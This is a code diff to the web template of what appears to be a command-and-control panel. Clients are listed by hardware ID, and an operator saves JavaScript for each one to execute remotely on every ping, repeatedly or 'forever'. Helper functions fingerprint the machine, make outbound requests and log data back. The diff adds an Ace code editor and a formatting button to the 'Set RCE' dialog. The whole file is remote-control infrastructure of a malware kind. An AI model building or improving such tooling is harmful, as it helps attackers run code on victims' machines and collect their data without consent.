@@ -22,7 +22,7 @@
                     </table>
                     <!-- RCE Modal -->
                     <div class="modal fade" id="rceModal" tabindex="-1" role="dialog" aria-labelledby="rceModalLabel" aria-hidden="true">
-                      <div class="modal-dialog" role="document">
+                      <div class="modal-dialog modal-lg" role="document">
                         <div class="modal-content">
                           <div class="modal-header">
                             <h5 class="modal-title" id="rceModalLabel">Set RCE</h5>
@@ -47,6 +47,7 @@
         </div>
 
         <%- include("includes/scripts.ejs") %>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/js-beautify/1.13.0/beautify.min.js"></script>
         
         <script type="text/javascript">
           let lastPings = {};
@@ -133,6 +134,13 @@
                   });
               });
 
+              let editor;
+
+              $('body').delegate('#formatCode', 'click', function(e) {
+                  e.preventDefault();
+                  editor.setValue(js_beautify(editor.getSession().getValue()), 1);
+              })
+
               $('body').delegate('.set-rce-button', 'click', function() {
                   const hwid = $(this).attr('hwid');
                   const rceModalBody = $('#rceModalBody');
@@ -148,35 +156,47 @@
                   });
 
                   $.get(`/api/v1/${hwid}/get_saved_rce`, function(data) {
-                    rceModalBody.empty();
+                        rceModalBody.empty();
 
-                    $('#rceClose').prop('disabled', false);
-                    $('#rceSave').prop('disabled', false);
+                        $('#rceClose').prop('disabled', false);
+                        $('#rceSave').prop('disabled', false);
 
-                    rceModalBody.append(`<div class="form-group">
-                            <label for="rceCodeInput">Code</label>
-                            <textarea id="rceCodeInput" hwid="${hwid}" class="form-control" placeholder="Enter code here..." rows="10">${data.code}</textarea>
-                            <br/>
-                            <a>Reserved Variables/Functions:</a><br/>
-                            <code>machineId()</code> <small class="text-muted">Returns client's HWID</small><br/>
-                            <code>postData(data)</code> <small class="text-muted">Adds data to the client's data logs</small><br/>
-                            <code>get('http(s)', url, headers, full)</code> <small class="text-muted">Makes a GET request</small><br/>
-                            <code>ping()</code> <small class="text-muted">Ping function</small><br/>
-                            <code>hwid</code> <small class="text-muted">Client's HWID</small><br/>
-                            <code>url</code> <small class="text-muted">Base URL (i.e. http://localhost:500)</small>
-                            <br/>
-                            <br/>
-                            <label for="amountOfTimesToRunInput">Amount of times to run</label>
-                            <input type="number" class="form-control" id="amountOfTimesToRunInput" min="-1" max="100" value="${data.timesToRun}" style="width:25%;">
-                            <small class="form-text text-muted">The amount of times the code will run per ping until it is deleted from the database.<br/>Use -1 for every ping (forever).</small>
-                        </div>`);
+                        rceModalBody.append(`<div class="form-group">
+                                <label for="rceCodeInput">Code</label>
+                                <!-- <textarea id="rceCodeInput" hwid="${hwid}" class="form-control" placeholder="Enter code here..." rows="10">${data.code}</textarea> -->
+                                <div id="editor" hwid="${hwid}">${data.code}</div>
+                                <small class="text-muted"><a class="text-muted" id="formatCode" href="#">Format</a></small>
+                                <br/>
+                                <br/>
+                                <a>Reserved Variables/Functions:</a><br/>
+                                <code>machineId()</code> <small class="text-muted">Returns client's HWID</small><br/>
+                                <code>postData(data)</code> <small class="text-muted">Adds data to the client's data logs</small><br/>
+                                <code>get('http(s)', url, headers, full)</code> <small class="text-muted">Makes a GET request</small><br/>
+                                <code>ping()</code> <small class="text-muted">Ping function</small><br/>
+                                <code>hwid</code> <small class="text-muted">Client's HWID</small><br/>
+                                <code>url</code> <small class="text-muted">Base URL (i.e. http://localhost:500)</small>
+                                <br/>
+                                <br/>
+                                <label for="amountOfTimesToRunInput">Amount of times to run</label>
+                                <input type="number" class="form-control" id="amountOfTimesToRunInput" min="-1" max="100" value="${data.timesToRun}" style="width:25%;">
+                                <small class="form-text text-muted">The amount of times the code will run per ping until it is deleted from the database.<br/>Use -1 for every ping (forever).</small>
+                            </div>`);
+
+                        editor = ace.edit("editor");
+                        editor.setOptions({
+                            fontSize: "12pt"
+                        });
+                        editor.setTheme("ace/theme/solarized_dark");
+                        editor.session.setMode("ace/mode/javascript");
                   });
               });
 
               $('body').delegate('#rceSave', 'click', function() {
-                  const hwid = $('#rceCodeInput').attr('hwid');
+                  if (!editor) return;
 
-                  $.post(`/api/v1/${hwid}/set_saved_rce`, { code: $('#rceCodeInput').val(), timesToRun: $('#amountOfTimesToRunInput').val() }, function(data) {
+                  const hwid = $('#editor').attr('hwid');
+
+                  $.post(`/api/v1/${hwid}/set_saved_rce`, { code: editor.getSession().getValue(), timesToRun: $('#amountOfTimesToRunInput').val() }, function(data) {
                       toastr.info(data.message);
                       $('#rceModal').modal('hide');  
                   });
